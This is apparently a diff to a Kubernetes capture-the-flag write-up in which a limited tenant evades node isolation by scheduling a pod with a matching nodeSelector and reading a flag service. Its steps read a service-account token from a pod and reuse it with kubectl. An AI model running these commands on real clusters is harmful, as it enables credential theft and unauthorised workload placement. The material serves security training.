@@ -28,8 +28,14 @@
 
 ## Attack Path Summary
 ```
-Attacker pod (no nodeSelector) → Discover restricted node with security=restricted label → Create new pod with nodeSelector: security=restricted → Pod schedules on restricted node → Access flag via local Service
+Attacker tenant (attacker-ns, limited RBAC) → Discover restricted node with
+  security=restricted label → Create pod in own tenant with matching
+  nodeSelector → Pod schedules on restricted node → Access flag via ClusterIP Service
 ```
+
+> 语义说明：nodeSelector 是调度机制，不是安全边界。该场景的“漏洞”是平台缺少
+> 准入策略（Gatekeeper/Kyverno/PSA）来限制租户将工作负载调度到受保护节点；
+> 攻击者本身只能在自己的 namespace（attacker-ns）内创建 pod。
 
 ## Prerequisites
 
@@ -51,16 +57,19 @@ kubectl get nodes --show-labels
 
 ### Step 2: Create Pod with Matching nodeSelector
 ```bash
-kubectl run evader --image=alpine:latest -n secure-ns \
+# Use the attacker SA token (RBAC is limited to attacker-ns)
+TOKEN=$(kubectl exec -n attacker-ns attacker-pod -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl --token=$TOKEN run evader --image=alpine:latest -n attacker-ns \
   --overrides='{"spec":{"nodeSelector":{"security":"restricted"}}}' \
   -- sleep 3600
 ```
 
 ### Step 3: Wait for Pod and Access Flag
 ```bash
-kubectl wait --for=condition=Ready pod/evader -n secure-ns --timeout=30s
+kubectl --token=$TOKEN wait --for=condition=Ready pod/evader -n attacker-ns --timeout=30s
 FLAG_IP=$(kubectl get svc flag-svc -n secure-ns -o jsonpath='{.spec.clusterIP}')
-kubectl exec -n secure-ns evader -- wget -qO- http://${FLAG_IP}:8080
+kubectl --token=$TOKEN exec evader -n attacker-ns -- wget -qO- http://${FLAG_IP}:8080
 ```
 
 ## Flag Location
